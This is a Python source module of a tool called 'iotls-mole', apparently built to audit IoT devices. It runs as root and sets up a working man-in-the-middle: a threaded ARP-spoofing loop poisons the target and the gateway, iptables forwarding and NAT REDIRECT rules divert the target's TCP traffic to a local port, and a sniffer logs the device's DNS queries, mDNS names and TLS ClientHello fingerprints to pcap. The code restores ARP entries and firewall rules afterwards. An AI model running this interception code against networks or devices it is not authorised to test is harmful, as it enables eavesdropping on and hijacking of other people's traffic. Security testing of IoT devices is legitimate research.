from __future__ import annotations

import os
import re
import shlex
import subprocess
import threading
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable

from scapy.all import ARP, DNS, IP, IPv6, PcapWriter, Raw, TCP, UDP, Ether, get_if_hwaddr, sendp, sniff, srp  # type: ignore

from .tlshello import looks_tls, parse_client_hello


@dataclass
class Env:
    target_ip: str
    target_mac: str
    gateway_ip: str
    gateway_mac: str
    iface: str
    local_ip: str
    old_forward: str


def run(cmd: list[str], check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=check)


def require_root():
    if os.geteuid() != 0:
        raise SystemExit("iotls-mole must run as root for ARP spoofing/netfilter")


def discover(target_ip: str) -> Env:
    gateway_ip, iface = default_route()
    return Env(
        target_ip=target_ip,
        target_mac=mac_for(target_ip, iface),
        gateway_ip=gateway_ip,
        gateway_mac=mac_for(gateway_ip, iface),
        iface=iface,
        local_ip=iface_ip(iface),
        old_forward=Path("/proc/sys/net/ipv4/ip_forward").read_text().strip(),
    )


def default_route() -> tuple[str, str]:
    line = run(["ip", "route", "show", "default"]).stdout.strip().splitlines()[0]
    toks = line.split()
    return toks[toks.index("via") + 1], toks[toks.index("dev") + 1]


def iface_ip(iface: str) -> str:
    out = run(["ip", "-4", "addr", "show", "dev", iface]).stdout
    if m := re.search(r"inet (\d+\.\d+\.\d+\.\d+)/", out):
        return m.group(1)
    raise RuntimeError(f"no IPv4 address on {iface}")


def mac_for(ip: str, iface: str, timeout: int = 2) -> str:
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, iface=iface, verbose=False)
    for _, response in ans:
        return response[Ether].src
    raise RuntimeError(f"could not resolve MAC for {ip} on {iface}")


class ArpSpoofer:
    def __init__(self, env: Env, log):
        self.env = env
        self.log = log
        self.our_mac = get_if_hwaddr(env.iface)
        self.stop = threading.Event()
        self.thread: threading.Thread | None = None

    def start(self):
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def restore(self):
        self.stop.set()
        if self.thread:
            self.thread.join(timeout=1)
        for _ in range(3):
            self._send_arp(self.env.gateway_ip, self.env.gateway_mac, self.env.target_ip, "ff:ff:ff:ff:ff:ff")
            self._send_arp(self.env.target_ip, self.env.target_mac, self.env.gateway_ip, "ff:ff:ff:ff:ff:ff")

    def _loop(self):
        while not self.stop.is_set():
            self._send_arp(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
            self._send_arp(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
            time.sleep(2)

    def _send_arp(self, psrc: str, hwsrc: str, pdst: str, hwdst: str):
        pkt = ARP(op=2, psrc=psrc, hwsrc=hwsrc, pdst=pdst, hwdst=hwdst)
        # Send both directed and broadcast replies. Some stacks ignore unsolicited
        # unicast updates unless an entry already exists; broadcast keeps lab
        # namespaces and consumer devices behaving consistently.
        sendp(Ether(src=hwsrc, dst=hwdst) / pkt, iface=self.env.iface, verbose=False)
        sendp(Ether(src=hwsrc, dst="ff:ff:ff:ff:ff:ff") / pkt, iface=self.env.iface, verbose=False)


class Netfilter:
    def __init__(self, env: Env, port: int, redirect_ports: list[int] | None = None):
        self.env = env
        self.port = port
        self.redirect_ports = redirect_ports or []
        self.rules: list[list[str]] = []

    def enable_forwarding(self):
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1\n")

    def install(self):
        self.enable_forwarding()
        self.purge_stale()
        for rule in self._desired_rules():
            run(rule)
            self.rules.append(rule)

    def cleanup(self):
        for rule in reversed(self.rules):
            self._delete_all(self._delete_cmd(rule))
        self.purge_stale()
        Path("/proc/sys/net/ipv4/ip_forward").write_text(self.env.old_forward + "\n")

    def purge_stale(self):
        """Best-effort removal of IoTLS-Mole rules from previous runs."""
        e = self.env
        exact_filter_specs = [
            ["INPUT", "-i", e.iface, "-s", e.target_ip, "-p", "tcp", "--dport", str(self.port), "-j", "ACCEPT"],
            ["FORWARD", "-i", e.iface, "-s", e.target_ip, "-j", "ACCEPT"],
            ["FORWARD", "-o", e.iface, "-d", e.target_ip, "-j", "ACCEPT"],
        ]
        for spec in exact_filter_specs:
            self._delete_all(["iptables", "-D", *spec])

        self._purge_saved_rules(
            "filter",
            lambda chain, line: (chain == "INPUT" and f"--dport {self.port}" in line and "-j ACCEPT" in line)
            or (chain == "FORWARD" and e.target_ip in line and "-j ACCEPT" in line),
        )
        self._purge_saved_rules(
            "nat",
            lambda chain, line: chain == "PREROUTING" and f"--to-ports {self.port}" in line and "-j REDIRECT" in line,
        )

    def _desired_rules(self) -> list[list[str]]:
        e = self.env
        rules = [
            ["iptables", "-I", "INPUT", "1", "-i", e.iface, "-s", e.target_ip, "-p", "tcp", "--dport", str(self.port), "-j", "ACCEPT"],
            ["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-j", "ACCEPT"],
            ["iptables", "-I", "FORWARD", "1", "-o", e.iface, "-d", e.target_ip, "-j", "ACCEPT"],
        ]
        redirect_ports = self.redirect_ports or [None]
        for port in redirect_ports:
            rule = ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", e.iface, "-s", e.target_ip, "-p", "tcp"]
            if port is not None:
                rule += ["--dport", str(port)]
            rule += ["-j", "REDIRECT", "--to-ports", str(self.port)]
            rules.append(rule)
        return rules

    @staticmethod
    def _delete_cmd(rule: list[str]) -> list[str]:
        cmd = rule.copy()
        for i, token in enumerate(cmd):
            if token in ("-A", "-I"):
                cmd[i] = "-D"
                if token == "-I" and i + 2 < len(cmd) and cmd[i + 2].isdigit():
                    del cmd[i + 2]
                break
        return cmd

    @staticmethod
    def _delete_all(cmd: list[str]):
        while run(cmd, check=False).returncode == 0:
            pass

    def _purge_saved_rules(self, table: str, predicate: Callable[[str, str], bool]):
        for line in run(["iptables-save", "-t", table], check=False).stdout.splitlines():
            if not line.startswith("-A "):
                continue
            toks = shlex.split(line)
            if len(toks) < 3 or toks[0] != "-A" or not predicate(toks[1], line):
                continue
            cmd = ["iptables", "-D", toks[1], *toks[2:]]
            if table != "filter":
                cmd[1:1] = ["-t", table]
            self._delete_all(cmd)


def start_dns_sniffer(env: Env, log, stop: threading.Event, include_udp: bool = False, pcap_path: str | None = None):
    writer = PcapWriter(pcap_path, sync=True) if pcap_path else None

    def callback(pkt):
        if writer is not None:
            try:
                writer.write(pkt)
            except Exception:
                pass
        try:
            handle_packet(pkt, env, log, include_udp)
        except Exception as exc:
            log.emit("WARN", msg="sniffer callback failed", error=str(exc))

    def run():
        try:
            sniff(iface=env.iface, filter=f"host {env.target_ip}", prn=callback, store=False, stop_filter=lambda _: stop.is_set())
        finally:
            if writer is not None:
                writer.close()

    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    return thread


def handle_packet(pkt, env: Env, log, include_udp: bool):
    if IPv6 in pkt:
        log.emit("WARN", msg="ipv6_seen_unsupported", src=pkt[IPv6].src, dst=pkt[IPv6].dst)
        return
    if IP not in pkt or pkt[IP].src != env.target_ip:
        return
    if TCP in pkt:
        handle_tcp(pkt, log)
    elif UDP in pkt:
        handle_udp(pkt, log, include_udp)


def handle_tcp(pkt, log):
    if int(pkt[TCP].flags) & 0x02:
        log.emit("TCP_SYN", dest=f"{pkt[IP].dst}:{pkt[TCP].dport}")
    if Raw in pkt and looks_tls(bytes(pkt[Raw].load)):
        hello = parse_client_hello(bytes(pkt[Raw].load))
        log.emit("TLS_CLIENTHELLO", source="sniff", dest=f"{pkt[IP].dst}:{pkt[TCP].dport}", sni=hello.sni or "none", alpn=",".join(hello.alpn) or None, versions=",".join(hello.offered_versions) or None, ja3=hello.ja3_hash)


def handle_udp(pkt, log, include_udp: bool):
    dport = pkt[UDP].dport
    if dport == 53 and DNS in pkt and pkt[DNS].qd:
        query = pkt[DNS].qd.qname.decode(errors="ignore").rstrip(".")
        log.emit("DNS", query=query, dest=pkt[IP].dst)
    elif dport == 5353 and DNS in pkt:
        handle_mdns(pkt, log)
    elif include_udp:
        log.emit("UDP", dest=f"{pkt[IP].dst}:{dport}", proto=classify_udp(dport, bytes(pkt[UDP].payload)))


def handle_mdns(pkt, log):
    """Surface mDNS service names; high-value device fingerprinting for IoT."""
    dns = pkt[DNS]
    records = []
    for section in (dns.qd, dns.an):
        if section is None:
            continue
        if isinstance(section, list):  # modern scapy: qd/an are list-like
            records.extend(section)
        else:                          # older scapy: records chain via .payload
            rr = section
            for _ in range(64):
                if rr is None or rr.__class__.__name__ not in ("DNSQR", "DNSRR"):
                    break
                records.append(rr)
                rr = rr.payload
    names: list[str] = []
    for rr in records[:64]:
        raw = getattr(rr, "qname", None) or getattr(rr, "rrname", None)
        if not raw:
            continue
        name = (raw.decode(errors="ignore") if isinstance(raw, bytes) else str(raw)).rstrip(".")
        if name and name not in names:
            names.append(name)
    if names:
        log.emit("MDNS", services=",".join(names[:16]), dest=pkt[IP].dst)


def classify_udp(port: int, payload: bytes) -> str:
    if port == 53:
        return "dns"
    if port == 123:
        return "ntp"
    if port in (3478, 5349):
        return "stun-turn"
    if port in (5683, 5684):
        return "coap-dtls"
    if port == 443:
        return "quic-or-dtls"
    if payload and payload[0] in range(20, 64) and len(payload) > 13:
        return "dtls-candidate"
    return "unknown"
